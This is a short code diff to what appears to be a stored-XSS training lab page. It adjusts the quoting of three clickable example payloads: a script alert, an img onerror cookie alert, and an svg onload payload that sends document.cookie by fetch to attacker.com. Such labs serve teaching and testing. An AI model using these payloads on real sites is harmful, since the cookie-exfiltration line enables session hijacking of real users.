@@ -255,9 +255,9 @@ if (isset($_GET['clear'])) {
             <h3>🎯 攻击Payload示例</h3>
             <p>在留言内容中使用以下Payload：</p>
             <div class="payload-list">
-                <code onclick="setPayload('&lt;script&gt;alert(\"存储型XSS\")&lt;/script&gt;')">&lt;script&gt;alert("存储型XSS")&lt;/script&gt;</code>
-                <code onclick="setPayload('&lt;img src=x onerror=alert(document.cookie)&gt;')">&lt;img src=x onerror=alert(document.cookie)&gt;</code>
-                <code onclick="setPayload('&lt;svg/onload=fetch(\'http://attacker.com/steal?c=\'+document.cookie)&gt;')">&lt;svg/onload=fetch('http://attacker.com/steal?c='+document.cookie)&gt;</code>
+                <code onclick='setPayload("<script>alert(\"存储型XSS\")</script>")'>&lt;script&gt;alert("存储型XSS")&lt;/script&gt;</code>
+                <code onclick='setPayload("<img src=x onerror=alert(document.cookie)>")'>&lt;img src=x onerror=alert(document.cookie)&gt;</code>
+                <code onclick='setPayload("<svg/onload=fetch(\"http://attacker.com/steal?c=\"+document.cookie)>")'>&lt;svg/onload=fetch("http://attacker.com/steal?c="+document.cookie)&gt;</code>
             </div>
             
             <div id="flagBox" class="flag-box">
